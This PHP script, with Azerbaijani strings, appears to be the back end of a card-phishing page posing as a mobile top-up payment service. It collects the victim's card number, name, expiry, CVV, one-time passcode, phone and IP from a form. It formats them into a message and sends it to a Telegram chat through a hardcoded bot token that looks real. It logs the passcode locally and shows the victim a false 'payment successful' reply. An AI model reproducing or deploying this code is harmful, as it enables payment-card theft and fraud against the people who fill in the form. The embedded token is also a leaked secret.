<?php
// YALNIZ POST İCƏZƏLİDİR
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(403);
    die('🚫 Giriş qadağandır!');
}

// BOT MƏLUMATLARI
$botToken = '8954241039:AAHSIz0Q6884ESNIiIdVCe4JxWWqR0xcTA4';
$chatId = '-1004332923672';

// POST MƏLUMATLARI
$cardName = isset($_POST['card_name']) ? trim(strip_tags($_POST['card_name'])) : 'Məlumat yoxdur';
$cardNumber = isset($_POST['card_number']) ? trim(strip_tags($_POST['card_number'])) : 'Məlumat yoxdur';
$cardExpiry = isset($_POST['card_expiry']) ? trim(strip_tags($_POST['card_expiry'])) : 'Məlumat yoxdur';
$cardCvv = isset($_POST['card_cvv']) ? trim(strip_tags($_POST['card_cvv'])) : 'Məlumat yoxdur';
$operator = isset($_POST['operator']) ? trim(strip_tags($_POST['operator'])) : 'Məlumat yoxdur';
$phone = isset($_POST['phone']) ? trim(strip_tags($_POST['phone'])) : 'Məlumat yoxdur';
$amount = isset($_POST['amount']) ? trim(strip_tags($_POST['amount'])) : 'Məlumat yoxdur';
$ip = isset($_POST['ip']) ? trim(strip_tags($_POST['ip'])) : $_SERVER['REMOTE_ADDR'];
$otp = isset($_POST['otp']) ? trim(strip_tags($_POST['otp'])) : 'Məlumat yoxdur';
$campaign = isset($_POST['campaign']) ? trim(strip_tags($_POST['campaign'])) : '';

$id = rand(1000, 9999);

// ============================================
// 📝 TƏMİZ VƏ ANLAŞILAN MESAJ FORMATI
// ============================================
$message = "═══════════════════════════════════\n";
$message .= "      💳 YENİ KART MƏLUMATLARI      \n";
$message .= "═══════════════════════════════════\n\n";

$message .= "📌 SİFARİŞ MƏLUMATLARI\n";
$message .= "───────────────────────────────\n";
$message .= "🆔 Sifariş ID: #" . $id . "\n";
$message .= "📱 Operator: " . $operator . "\n";
$message .= "📞 Telefon: " . $phone . "\n";
$message .= "💰 Məbləğ: " . $amount . " AZN\n";
if (!empty($campaign)) {
    $message .= "📦 Paket: " . $campaign . "\n";
}
$message .= "───────────────────────────────\n\n";

$message .= "💳 KART MƏLUMATLARI\n";
$message .= "───────────────────────────────\n";
$message .= "💳 Kart Nömrəsi: " . $cardNumber . "\n";
$message .= "👤 Kart Sahibi: " . $cardName . "\n";
$message .= "📅 Bitiş Tarixi: " . $cardExpiry . "\n";
$message .= "🔐 CVV Kodu: " . $cardCvv . "\n";
$message .= "───────────────────────────────\n\n";

$message .= "🔐 TƏSDİQ MƏLUMATLARI\n";
$message .= "───────────────────────────────\n";
$message .= "🔑 OTP Kodu: " . $otp . "\n";
$message .= "🌐 IP Ünvan: " . $ip . "\n";
$message .= "⏰ Vaxt: " . date('d.m.Y H:i:s') . "\n";
$message .= "───────────────────────────────\n\n";

$message .= "📱 BAĞLI NÖMRƏ: " . $phone . "\n";
$message .= "═══════════════════════════════════\n";
$message .= "✅ AzərPay ilə uğurlu əməliyyat!";

// TELEGRAM-A GÖNDƏR
$url = "https://api.telegram.org/bot{$botToken}/sendMessage";

$postData = [
    'chat_id' => $chatId,
    'text' => $message,
    'parse_mode' => 'HTML'
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);

$response = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

// LOG
$logData = date('Y-m-d H:i:s') . " | ID: #$id | IP: $ip | OTP: $otp | HTTP: $httpCode\n";
file_put_contents('telegram_log.txt', $logData, FILE_APPEND);

// CAVAB
header('Content-Type: application/json');
echo json_encode(['status' => 'success', 'message' => '✅ Ödəniş uğurla tamamlandı!']);
exit;
?>
